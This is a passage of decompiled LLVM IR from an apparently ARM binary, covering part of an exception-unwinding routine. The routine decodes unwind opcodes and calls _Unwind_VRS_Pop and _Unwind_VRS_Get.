  %v0_195d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_195d0 = trunc i32 %v0_195d0 to i8
  %v2_195d0 = load i32, i32* @r5, align 4
  %v3_195d0 = add i32 %v2_195d0, 8
  %v4_195d0 = inttoptr i32 %v3_195d0 to i8*
  store i8 %v1_195d0, i8* %v4_195d0, align 1
  %v0_195d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_195d4 = load i32, i32* @r5, align 4
  %v2_195d4 = inttoptr i32 %v1_195d4 to i32*
  store i32 %v0_195d4, i32* %v2_195d4, align 4
  br label %dec_label_pc_195d8

dec_label_pc_195d8:                               ; preds = %.thread26, %dec_label_pc_195b8
  %v0_195d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_195d8 = udiv i32 %v0_195d8, 16777216
  %v1_195dc = urem i32 %v3_195d8, 16
  %v3_195e0 = mul i32 %v0_195d8, 256
  %v1_195e4 = add nuw nsw i32 %v1_195dc, 1
  store i32 %v1_195e4, i32* %r1.global-to-local, align 4
  %v1_195e8 = and i32 %v3_195d8, 240
  store i32 %v1_195e8, i32* %r3.global-to-local, align 4
  %v1_195ec = load i32, i32* @r5, align 4
  %v2_195ec = inttoptr i32 %v1_195ec to i32*
  store i32 %v3_195e0, i32* %v2_195ec, align 4
  %v0_195f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_195f0 = load i32, i32* %r3.global-to-local, align 4
  %v4_195f0 = mul i32 %v1_195f0, 4096
  %v5_195f0 = or i32 %v4_195f0, %v0_195f0
  br label %dec_label_pc_195f4

dec_label_pc_195f4:                               ; preds = %dec_label_pc_195a4, %dec_label_pc_195d8
  %storemerge = phi i32 [ %v5_195f0, %dec_label_pc_195d8 ], [ 720897, %dec_label_pc_195a4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_195f4 = load i32, i32* @r7, align 4
  store i32 %v0_195f4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_19600 = call i32 @_Unwind_VRS_Pop(i32 %v0_195f4, i32 1, i32 5, i32 5)
  store i32 %v4_19600, i32* %r0.global-to-local, align 4
  %v2_19604 = icmp eq i32 %v4_19600, 0
  store i1 %v2_19604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19604, label %dec_label_pc_1933c.backedge, label %dec_label_pc_1960c

dec_label_pc_1960c:                               ; preds = %dec_label_pc_19858, %dec_label_pc_19588, %dec_label_pc_19668, %dec_label_pc_19a0c, %dec_label_pc_199dc, %dec_label_pc_199b8, %dec_label_pc_19844, %dec_label_pc_195f4, %dec_label_pc_19408, %dec_label_pc_193fc, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_19614:                               ; preds = %dec_label_pc_194cc
  %v7_19614 = icmp eq i32 %v1_1939c, 160
  store i1 %v7_19614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19614, label %dec_label_pc_1961c, label %dec_label_pc_19658

dec_label_pc_1961c:                               ; preds = %dec_label_pc_19614
  %v0_1961c = load i32, i32* %ip.global-to-local, align 4
  %v1_1961c = urem i32 %v0_1961c, 8
  %v1_19620 = xor i32 %v1_1961c, 7
  store i32 %v1_19620, i32* %r3.global-to-local, align 4
  %v6_19628 = lshr i32 4080, %v1_19620
  %v1_1962c = and i32 %v0_19394, 8
  %v2_1962c = icmp eq i32 %v1_1962c, 0
  store i1 %v2_1962c, i1* %cpsr_z.global-to-local, align 1
  %v1_19630 = and i32 %v6_19628, 4080
  %tmp155 = mul nuw nsw i32 %v1_1962c, 2048
  %tmp156 = or i32 %v1_19630, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_1963c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_199cc.dec_label_pc_1963c_crit_edge, %bb157, %dec_label_pc_19828, %dec_label_pc_197bc, %dec_label_pc_1971c, %dec_label_pc_1961c
  %v2_19644 = phi i32 [ %v2_19740, %.thread44 ], [ %v2_19748, %bb157 ], [ %v2_19644.pre, %dec_label_pc_199cc.dec_label_pc_1963c_crit_edge ], [ %v2_19578, %.thread24 ], [ %storemerge130, %dec_label_pc_19828 ], [ %storemerge131, %dec_label_pc_197bc ], [ %storemerge132, %dec_label_pc_1971c ], [ %tmp156, %dec_label_pc_1961c ]
  %v0_19640 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_199cc.dec_label_pc_1963c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_19828 ], [ 3, %dec_label_pc_197bc ], [ 1, %dec_label_pc_1971c ], [ 0, %dec_label_pc_1961c ]
  %v0_1963c = load i32, i32* @r7, align 4
  store i32 %v0_1963c, i32* %r0.global-to-local, align 4
  store i32 %v0_19640, i32* %r3.global-to-local, align 4
  %v4_19644 = call i32 @_Unwind_VRS_Pop(i32 %v0_1963c, i32 %v0_19640, i32 %v2_19644, i32 %v0_19640)
  store i32 %v4_19644, i32* %r0.global-to-local, align 4
  %v2_19648 = icmp eq i32 %v4_19644, 0
  store i1 %v2_19648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19648, label %dec_label_pc_1933c.backedge, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_1963c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_19658:                               ; preds = %dec_label_pc_19614
  %v7_19658 = icmp eq i32 %v1_1939c, 176
  store i1 %v7_19658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19658, label %dec_label_pc_196a0, label %dec_label_pc_19660

dec_label_pc_19660:                               ; preds = %dec_label_pc_19658
  %v7_19660 = icmp eq i32 %v1_1939c, 192
  store i1 %v7_19660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19660, label %dec_label_pc_19750, label %dec_label_pc_19668

dec_label_pc_19668:                               ; preds = %dec_label_pc_19660
  %v1_19668 = and i32 %v0_19394, 248
  store i32 %v1_19668, i32* %r3.global-to-local, align 4
  %v7_1966c = icmp eq i32 %v1_19668, 208
  store i1 %v7_1966c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1966c, label %dec_label_pc_19674, label %dec_label_pc_1960c

dec_label_pc_19674:                               ; preds = %dec_label_pc_19668
  %v1_19674 = urem i32 %v0_19394, 8
  %v1_19678 = add nuw nsw i32 %v1_19674, 1
  %v1_1967c = or i32 %v1_19678, 524288
  store i32 %v1_1967c, i32* %r2.global-to-local, align 4
  %v0_19680 = load i32, i32* @r7, align 4
  store i32 %v0_19680, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1968c = call i32 @_Unwind_VRS_Pop(i32 %v0_19680, i32 1, i32 %v1_1967c, i32 5)
  store i32 %v4_1968c, i32* %r0.global-to-local, align 4
  %v2_19690 = icmp eq i32 %v4_1968c, 0
  store i1 %v2_19690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19690, label %dec_label_pc_1933c.backedge, label %dec_label_pc_19698

dec_label_pc_19698:                               ; preds = %dec_label_pc_19674
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_196a0:                               ; preds = %dec_label_pc_19658
  %v0_196a0 = load i32, i32* %ip.global-to-local, align 4
  %v7_196a0 = icmp eq i32 %v0_196a0, 177
  store i1 %v7_196a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196a0, label %dec_label_pc_199a4, label %dec_label_pc_196a8

dec_label_pc_196a8:                               ; preds = %dec_label_pc_196a0
  %v7_196a8 = icmp eq i32 %v0_196a0, 178
  store i1 %v7_196a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196a8, label %dec_label_pc_1987c, label %dec_label_pc_196b0

dec_label_pc_196b0:                               ; preds = %dec_label_pc_196a8
  %v7_196b0 = icmp eq i32 %v0_196a0, 179
  store i1 %v7_196b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_196b0, label %dec_label_pc_196b8, label %dec_label_pc_19724

dec_label_pc_196b8:                               ; preds = %dec_label_pc_196b0
  %v0_196b8 = load i32, i32* @r5, align 4
  %v1_196b8 = add i32 %v0_196b8, 8
  %v2_196b8 = inttoptr i32 %v1_196b8 to i8*
  %v3_196b8 = load i8, i8* %v2_196b8, align 1
  %v4_196b8 = zext i8 %v3_196b8 to i32
  store i32 %v4_196b8, i32* %r3.global-to-local, align 4
  %v2_196bc = icmp eq i8 %v3_196b8, 0
  store i1 %v2_196bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196bc, label %dec_label_pc_196cc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_196b8
  %v2_196c0 = add nsw i32 %v4_196b8, -1
  store i32 %v2_196c0, i32* %r3.global-to-local, align 4
  %v2_196c4 = trunc i32 %v2_196c0 to i8
  store i8 %v2_196c4, i8* %v2_196b8, align 1
  %v0_196c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_196c8.pr.pr, label %.thread30.dec_label_pc_196cc_crit_edge, label %dec_label_pc_19700

.thread30.dec_label_pc_196cc_crit_edge:           ; preds = %.thread30
  %v0_196cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_196cc

dec_label_pc_196cc:                               ; preds = %.thread30.dec_label_pc_196cc_crit_edge, %dec_label_pc_196b8
  %v2_196e4 = phi i32 [ %v0_196cc.pre, %.thread30.dec_label_pc_196cc_crit_edge ], [ %v0_196b8, %dec_label_pc_196b8 ]
  %v1_196cc = add i32 %v2_196e4, 9
  %v2_196cc = inttoptr i32 %v1_196cc to i8*
  %v3_196cc = load i8, i8* %v2_196cc, align 1
  %v4_196cc = zext i8 %v3_196cc to i32
  store i32 %v4_196cc, i32* %r3.global-to-local, align 4
  %v2_196d0 = icmp eq i8 %v3_196cc, 0
  store i1 %v2_196d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196d0, label %dec_label_pc_1971c, label %dec_label_pc_196e0

dec_label_pc_196e0:                               ; preds = %dec_label_pc_196cc
  %v1_196e0 = add nsw i32 %v4_196cc, -1
  store i32 %v1_196e0, i32* %r3.global-to-local, align 4
  %v1_196e4 = trunc i32 %v1_196e0 to i8
  store i8 %v1_196e4, i8* %v2_196cc, align 1
  %v0_196e8 = load i32, i32* @r5, align 4
  %v1_196e8 = add i32 %v0_196e8, 4
  %v2_196e8 = inttoptr i32 %v1_196e8 to i32*
  %v3_196e8 = load i32, i32* %v2_196e8, align 4
  store i32 %v3_196e8, i32* %r2.global-to-local, align 4
  %v1_196ec = inttoptr i32 %v3_196e8 to i32*
  %v2_196ec = load i32, i32* %v1_196ec, align 4
  store i32 %v2_196ec, i32* %r0.global-to-local, align 4
  %v4_196ec = add i32 %v3_196e8, 4
  store i32 %v4_196ec, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_196ec, i32* %v2_196e8, align 4
  %v0_196f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_196f8 = trunc i32 %v0_196f8 to i8
  %v2_196f8 = load i32, i32* @r5, align 4
  %v3_196f8 = add i32 %v2_196f8, 8
  %v4_196f8 = inttoptr i32 %v3_196f8 to i8*
  store i8 %v1_196f8, i8* %v4_196f8, align 1
  %v0_196fc = load i32, i32* %r0.global-to-local, align 4
  %v1_196fc = load i32, i32* @r5, align 4
  %v2_196fc = inttoptr i32 %v1_196fc to i32*
  store i32 %v0_196fc, i32* %v2_196fc, align 4
  br label %dec_label_pc_19700

dec_label_pc_19700:                               ; preds = %.thread30, %dec_label_pc_196e0
  %v0_19700 = load i32, i32* %r0.global-to-local, align 4
  %v3_19700 = udiv i32 %v0_19700, 16777216
  %v1_19704 = urem i32 %v3_19700, 16
  %v3_19708 = mul i32 %v0_19700, 256
  store i32 %v3_19708, i32* %r0.global-to-local, align 4
  %v1_1970c = add nuw nsw i32 %v1_19704, 1
  store i32 %v1_1970c, i32* %r2.global-to-local, align 4
  %v1_19710 = and i32 %v3_19700, 240
  store i32 %v1_19710, i32* %r3.global-to-local, align 4
  %v1_19714 = load i32, i32* @r5, align 4
  %v2_19714 = inttoptr i32 %v1_19714 to i32*
  store i32 %v3_19708, i32* %v2_19714, align 4
  %v0_19718 = load i32, i32* %r2.global-to-local, align 4
  %v1_19718 = load i32, i32* %r3.global-to-local, align 4
  %v4_19718 = mul i32 %v1_19718, 4096
  %v5_19718 = or i32 %v4_19718, %v0_19718
  br label %dec_label_pc_1971c

dec_label_pc_1971c:                               ; preds = %dec_label_pc_196cc, %dec_label_pc_19700
  %storemerge132 = phi i32 [ %v5_19718, %dec_label_pc_19700 ], [ 720897, %dec_label_pc_196cc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_19724:                               ; preds = %dec_label_pc_196b0
  %v1_19724 = and i32 %v0_19394, 252
  store i32 %v1_19724, i32* %r3.global-to-local, align 4
  %v7_19728 = icmp eq i32 %v1_19724, 180
  store i1 %v7_19728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19728, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_19724
  %v2_1972c = urem i32 %v0_19394, 4
  %v2_19734 = add nuw nsw i32 %v2_1972c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_19740 = or i32 %v2_19734, 262144
  store i32 %v2_19740, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1963c

bb157:                                            ; preds = %dec_label_pc_19724
  %v2_19730 = urem i32 %v0_196a0, 8
  %v2_19738 = add nuw nsw i32 %v2_19730, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19748 = or i32 %v2_19738, 524288
  store i32 %v2_19748, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_19750:                               ; preds = %dec_label_pc_19660
  %v0_19750 = load i32, i32* %ip.global-to-local, align 4
  %v7_19750 = icmp eq i32 %v0_19750, 198
  store i1 %v7_19750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19750, label %dec_label_pc_19758, label %dec_label_pc_1955c

dec_label_pc_19758:                               ; preds = %dec_label_pc_19750
  %v0_19758 = load i32, i32* @r5, align 4
  %v1_19758 = add i32 %v0_19758, 8
  %v2_19758 = inttoptr i32 %v1_19758 to i8*
  %v3_19758 = load i8, i8* %v2_19758, align 1
  %v4_19758 = zext i8 %v3_19758 to i32
  store i32 %v4_19758, i32* %r3.global-to-local, align 4
  %v2_1975c = icmp eq i8 %v3_19758, 0
  store i1 %v2_1975c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1975c, label %dec_label_pc_1976c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19758
  %v2_19760 = add nsw i32 %v4_19758, -1
  store i32 %v2_19760, i32* %r3.global-to-local, align 4
  %v2_19764 = trunc i32 %v2_19760 to i8
  store i8 %v2_19764, i8* %v2_19758, align 1
  %v0_19768.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19768.pr.pr, label %.thread48.dec_label_pc_1976c_crit_edge, label %dec_label_pc_197a0

.thread48.dec_label_pc_1976c_crit_edge:           ; preds = %.thread48
  %v0_1976c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %.thread48.dec_label_pc_1976c_crit_edge, %dec_label_pc_19758
  %v2_19784 = phi i32 [ %v0_1976c.pre, %.thread48.dec_label_pc_1976c_crit_edge ], [ %v0_19758, %dec_label_pc_19758 ]
  %v1_1976c = add i32 %v2_19784, 9
  %v2_1976c = inttoptr i32 %v1_1976c to i8*
  %v3_1976c = load i8, i8* %v2_1976c, align 1
  %v4_1976c = zext i8 %v3_1976c to i32
  store i32 %v4_1976c, i32* %r3.global-to-local, align 4
  %v2_19770 = icmp eq i8 %v3_1976c, 0
  store i1 %v2_19770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19770, label %dec_label_pc_197bc, label %dec_label_pc_19780

dec_label_pc_19780:                               ; preds = %dec_label_pc_1976c
  %v1_19780 = add nsw i32 %v4_1976c, -1
  store i32 %v1_19780, i32* %r3.global-to-local, align 4
  %v1_19784 = trunc i32 %v1_19780 to i8
  store i8 %v1_19784, i8* %v2_1976c, align 1
  %v0_19788 = load i32, i32* @r5, align 4
  %v1_19788 = add i32 %v0_19788, 4
  %v2_19788 = inttoptr i32 %v1_19788 to i32*
  %v3_19788 = load i32, i32* %v2_19788, align 4
  store i32 %v3_19788, i32* %r2.global-to-local, align 4
  %v1_1978c = inttoptr i32 %v3_19788 to i32*
  %v2_1978c = load i32, i32* %v1_1978c, align 4
  store i32 %v2_1978c, i32* %r0.global-to-local, align 4
  %v4_1978c = add i32 %v3_19788, 4
  store i32 %v4_1978c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1978c, i32* %v2_19788, align 4
  %v0_19798 = load i32, i32* %r3.global-to-local, align 4
  %v1_19798 = trunc i32 %v0_19798 to i8
  %v2_19798 = load i32, i32* @r5, align 4
  %v3_19798 = add i32 %v2_19798, 8
  %v4_19798 = inttoptr i32 %v3_19798 to i8*
  store i8 %v1_19798, i8* %v4_19798, align 1
  %v0_1979c = load i32, i32* %r0.global-to-local, align 4
  %v1_1979c = load i32, i32* @r5, align 4
  %v2_1979c = inttoptr i32 %v1_1979c to i32*
  store i32 %v0_1979c, i32* %v2_1979c, align 4
  br label %dec_label_pc_197a0

dec_label_pc_197a0:                               ; preds = %.thread48, %dec_label_pc_19780
  %v0_197a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_197a0 = udiv i32 %v0_197a0, 16777216
  %v1_197a4 = urem i32 %v3_197a0, 16
  %v3_197a8 = mul i32 %v0_197a0, 256
  store i32 %v3_197a8, i32* %r0.global-to-local, align 4
  %v1_197ac = add nuw nsw i32 %v1_197a4, 1
  store i32 %v1_197ac, i32* %r2.global-to-local, align 4
  %v1_197b0 = and i32 %v3_197a0, 240
  store i32 %v1_197b0, i32* %r3.global-to-local, align 4
  %v1_197b4 = load i32, i32* @r5, align 4
  %v2_197b4 = inttoptr i32 %v1_197b4 to i32*
  store i32 %v3_197a8, i32* %v2_197b4, align 4
  %v0_197b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_197b8 = load i32, i32* %r3.global-to-local, align 4
  %v4_197b8 = mul i32 %v1_197b8, 4096
  %v5_197b8 = or i32 %v4_197b8, %v0_197b8
  br label %dec_label_pc_197bc

dec_label_pc_197bc:                               ; preds = %dec_label_pc_1976c, %dec_label_pc_197a0
  %storemerge131 = phi i32 [ %v5_197b8, %dec_label_pc_197a0 ], [ 720897, %dec_label_pc_1976c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_197c4:                               ; preds = %dec_label_pc_19580
  %v0_197c4 = load i32, i32* @r5, align 4
  %v1_197c4 = add i32 %v0_197c4, 8
  %v2_197c4 = inttoptr i32 %v1_197c4 to i8*
  %v3_197c4 = load i8, i8* %v2_197c4, align 1
  %v4_197c4 = zext i8 %v3_197c4 to i32
  store i32 %v4_197c4, i32* %r3.global-to-local, align 4
  %v2_197c8 = icmp eq i8 %v3_197c4, 0
  store i1 %v2_197c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197c8, label %dec_label_pc_197d8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_197c4
  %v2_197cc = add nsw i32 %v4_197c4, -1
  store i32 %v2_197cc, i32* %r3.global-to-local, align 4
  %v2_197d0 = trunc i32 %v2_197cc to i8
  store i8 %v2_197d0, i8* %v2_197c4, align 1
  %v0_197d4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_197d4.pr.pr, label %.thread52.dec_label_pc_197d8_crit_edge, label %dec_label_pc_1980c

.thread52.dec_label_pc_197d8_crit_edge:           ; preds = %.thread52
  %v0_197d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_197d8

dec_label_pc_197d8:                               ; preds = %.thread52.dec_label_pc_197d8_crit_edge, %dec_label_pc_197c4
  %v2_197f0 = phi i32 [ %v0_197d8.pre, %.thread52.dec_label_pc_197d8_crit_edge ], [ %v0_197c4, %dec_label_pc_197c4 ]
  %v1_197d8 = add i32 %v2_197f0, 9
  %v2_197d8 = inttoptr i32 %v1_197d8 to i8*
  %v3_197d8 = load i8, i8* %v2_197d8, align 1
  %v4_197d8 = zext i8 %v3_197d8 to i32
  store i32 %v4_197d8, i32* %r3.global-to-local, align 4
  %v2_197dc = icmp eq i8 %v3_197d8, 0
  store i1 %v2_197dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_197dc, label %dec_label_pc_19828, label %dec_label_pc_197ec

dec_label_pc_197ec:                               ; preds = %dec_label_pc_197d8
  %v1_197ec = add nsw i32 %v4_197d8, -1
  store i32 %v1_197ec, i32* %r3.global-to-local, align 4
  %v1_197f0 = trunc i32 %v1_197ec to i8
  store i8 %v1_197f0, i8* %v2_197d8, align 1
  %v0_197f4 = load i32, i32* @r5, align 4
  %v1_197f4 = add i32 %v0_197f4, 4
  %v2_197f4 = inttoptr i32 %v1_197f4 to i32*
  %v3_197f4 = load i32, i32* %v2_197f4, align 4
  store i32 %v3_197f4, i32* %r2.global-to-local, align 4
  %v1_197f8 = inttoptr i32 %v3_197f4 to i32*
  %v2_197f8 = load i32, i32* %v1_197f8, align 4
  store i32 %v2_197f8, i32* %r0.global-to-local, align 4
  %v4_197f8 = add i32 %v3_197f4, 4
  store i32 %v4_197f8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_197f8, i32* %v2_197f4, align 4
  %v0_19804 = load i32, i32* %r3.global-to-local, align 4
  %v1_19804 = trunc i32 %v0_19804 to i8
  %v2_19804 = load i32, i32* @r5, align 4
  %v3_19804 = add i32 %v2_19804, 8
  %v4_19804 = inttoptr i32 %v3_19804 to i8*
  store i8 %v1_19804, i8* %v4_19804, align 1
  %v0_19808 = load i32, i32* %r0.global-to-local, align 4
  %v1_19808 = load i32, i32* @r5, align 4
  %v2_19808 = inttoptr i32 %v1_19808 to i32*
  store i32 %v0_19808, i32* %v2_19808, align 4
  br label %dec_label_pc_1980c

dec_label_pc_1980c:                               ; preds = %.thread52, %dec_label_pc_197ec
  %v0_1980c = load i32, i32* %r0.global-to-local, align 4
  %v3_1980c = udiv i32 %v0_1980c, 16777216
  %v1_19810 = urem i32 %v3_1980c, 16
  %v3_19814 = mul i32 %v0_1980c, 256
  store i32 %v3_19814, i32* %r0.global-to-local, align 4
  %v1_19818 = add nuw nsw i32 %v1_19810, 1
  store i32 %v1_19818, i32* %r2.global-to-local, align 4
  %v1_1981c = and i32 %v3_1980c, 240
  store i32 %v1_1981c, i32* %r3.global-to-local, align 4
  %v1_19820 = load i32, i32* @r5, align 4
  %v2_19820 = inttoptr i32 %v1_19820 to i32*
  store i32 %v3_19814, i32* %v2_19820, align 4
  %v0_19824 = load i32, i32* %r2.global-to-local, align 4
  %v1_19824 = load i32, i32* %r3.global-to-local, align 4
  %v4_19824 = mul i32 %v1_19824, 4096
  %v5_19824 = or i32 %v4_19824, %v0_19824
  br label %dec_label_pc_19828

dec_label_pc_19828:                               ; preds = %dec_label_pc_197d8, %dec_label_pc_1980c
  %storemerge130 = phi i32 [ %v5_19824, %dec_label_pc_1980c ], [ 720897, %dec_label_pc_197d8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1963c

dec_label_pc_19830:                               ; preds = %dec_label_pc_1955c
  %v0_19830 = load i32, i32* @r5, align 4
  %v1_19830 = add i32 %v0_19830, 8
  %v2_19830 = inttoptr i32 %v1_19830 to i8*
  %v3_19830 = load i8, i8* %v2_19830, align 1
  %v4_19830 = zext i8 %v3_19830 to i32
  store i32 %v4_19830, i32* %r3.global-to-local, align 4
  %v2_19834 = icmp eq i8 %v3_19830, 0
  store i1 %v2_19834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19834, label %dec_label_pc_199dc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_19830
  %v2_19838 = add nsw i32 %v4_19830, -1
  store i32 %v2_19838, i32* %r3.global-to-local, align 4
  %v2_1983c = trunc i32 %v2_19838 to i8
  store i8 %v2_1983c, i8* %v2_19830, align 1
  %v0_19840.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19840.pr.pr, label %.thread56.dec_label_pc_199dc_crit_edge, label %dec_label_pc_19844

.thread56.dec_label_pc_199dc_crit_edge:           ; preds = %.thread56
  %v0_199dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199dc

dec_label_pc_19844:                               ; preds = %.thread56, %dec_label_pc_199e8
  %v0_19844 = load i32, i32* %r0.global-to-local, align 4
  %v3_19844 = udiv i32 %v0_19844, 16777216
  store i32 %v3_19844, i32* %r3.global-to-local, align 4
  store i32 %v3_19844, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19844, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1984c = mul i32 %v0_19844, 256
  store i32 %v3_1984c, i32* %r0.global-to-local, align 4
  %v1_19850 = load i32, i32* @r5, align 4
  %v2_19850 = inttoptr i32 %v1_19850 to i32*
  store i32 %v3_1984c, i32* %v2_19850, align 4
  br i1 %tmp184, label %dec_label_pc_1960c, label %dec_label_pc_19858

dec_label_pc_19858:                               ; preds = %dec_label_pc_19844
  %v0_19858 = load i32, i32* %r3.global-to-local, align 4
  %v1_19858 = and i32 %v0_19858, 240
  store i32 %v1_19858, i32* %r3.global-to-local, align 4
  %v2_19858 = icmp eq i32 %v1_19858, 0
  store i1 %v2_19858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19858, label %dec_label_pc_19860, label %dec_label_pc_1960c

dec_label_pc_19860:                               ; preds = %dec_label_pc_19858
  %v0_19860 = load i32, i32* @r7, align 4
  store i32 %v0_19860, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19868 = load i32, i32* %r2.global-to-local, align 4
  %v4_19868 = call i32 @_Unwind_VRS_Pop(i32 %v0_19860, i32 4, i32 %v2_19868, i32 0)
  store i32 %v4_19868, i32* %r0.global-to-local, align 4
  %v2_1986c = icmp eq i32 %v4_19868, 0
  store i1 %v2_1986c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1986c, label %dec_label_pc_1933c.backedge, label %dec_label_pc_19874

dec_label_pc_19874:                               ; preds = %dec_label_pc_19860
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19464

dec_label_pc_1987c:                               ; preds = %dec_label_pc_196a8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19888 = load i32, i32* @r7, align 4
  store i32 %v0_19888, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19894 = call i32 @_Unwind_VRS_Get(i32 %v0_19888, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19894, i32* %r0.global-to-local, align 4
  %v0_19898 = load i32, i32* @r5, align 4
  %v1_19898 = add i32 %v0_19898, 8
  %v2_19898 = inttoptr i32 %v1_19898 to i8*
  %v3_19898 = load i8, i8* %v2_19898, align 1
  %v4_19898 = zext i8 %v3_19898 to i32
  store i32 %v4_19898, i32* %r1.global-to-local, align 4
  %v2_1989c = icmp eq i8 %v3_19898, 0
  store i1 %v2_1989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1989c, label %dec_label_pc_198ac, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1987c
  %v2_198a0 = add nsw i32 %v4_19898, -1
  store i32 %v2_198a0, i32* %r3.global-to-local, align 4
  %v2_198a4 = trunc i32 %v2_198a0 to i8
  store i8 %v2_198a4, i8* %v2_19898, align 1
  %v0_198a8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_198a8.pr.pr, label %.thread58.dec_label_pc_198ac_crit_edge, label %dec_label_pc_198d8

.thread58.dec_label_pc_198ac_crit_edge:           ; preds = %.thread58
  %v0_198ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_198ac

dec_label_pc_198ac:                               ; preds = %.thread58.dec_label_pc_198ac_crit_edge, %dec_label_pc_1987c
  %v2_198c0 = phi i32 [ %v0_198ac.pre, %.thread58.dec_label_pc_198ac_crit_edge ], [ %v0_19898, %dec_label_pc_1987c ]
  %v1_198ac = add i32 %v2_198c0, 9
  %v2_198ac = inttoptr i32 %v1_198ac to i8*
  %v3_198ac = load i8, i8* %v2_198ac, align 1
  %v4_198ac = zext i8 %v3_198ac to i32
  store i32 %v4_198ac, i32* %r3.global-to-local, align 4
  %v2_198b0 = icmp eq i8 %v3_198ac, 0
  store i1 %v2_198b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_198b0, label %bb158, label %dec_label_pc_198bc

bb158:                                            ; preds = %dec_label_pc_198ac
  %v1_198b4 = load i32, i32* @r6, align 4
  store i32 %v1_198b4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19900

dec_label_pc_198bc:                               ; preds = %dec_label_pc_198ac
  %v1_198bc = add nsw i32 %v4_198ac, -1
  store i32 %v1_198bc, i32* %r3.global-to-local, align 4
